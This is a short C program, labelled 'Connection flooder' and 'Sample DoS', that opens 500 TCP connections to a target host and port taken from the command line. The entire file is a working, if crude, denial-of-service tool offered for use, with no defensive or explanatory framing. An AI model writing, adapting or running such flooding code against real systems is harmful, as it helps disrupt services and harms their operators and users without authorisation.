/*
Connection flooder.
*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <errno.h>
#include <netdb.h>
#include <signal.h>
void usage(){
	printf("\nSample DoS");
	printf("\nUsage:./dos <host> <port> ");
	printf("\n");
	return;
}
main(int argc, char *argv[]){
	int i, sock, conexao, port;
	char *HOST;
	struct sockaddr_in dest;
	int inicio, final;
	port = 80; //Default
	if(argc > 1){
		HOST = argv[1];
	if(argv[2] !=0){
		port = atoi(argv[2]);
		}
	}
	if (argc == 1){
	usage();
	exit(0);
	}
inicio = 1;
final  = 500;
printf("\n[+] Opening Connections in %s:%d", HOST, port);
for (i = (inicio); i <= (final) ; i++){ //Change for time, not a sample int, 
	dest.sin_addr.s_addr = inet_addr(HOST); //target
	dest.sin_family = AF_INET;
	dest.sin_port = htons(port);//Service target
	sock = socket(AF_INET, SOCK_STREAM, 0); //socket tcp
	conexao = connect (sock, (struct sockaddr *)&dest, sizeof dest);
	if(conexao == 0){
		printf("\n[+]Connection estabilish %d", i);
	}
}
printf("\n[+]Done\n");
close(sock); //
}
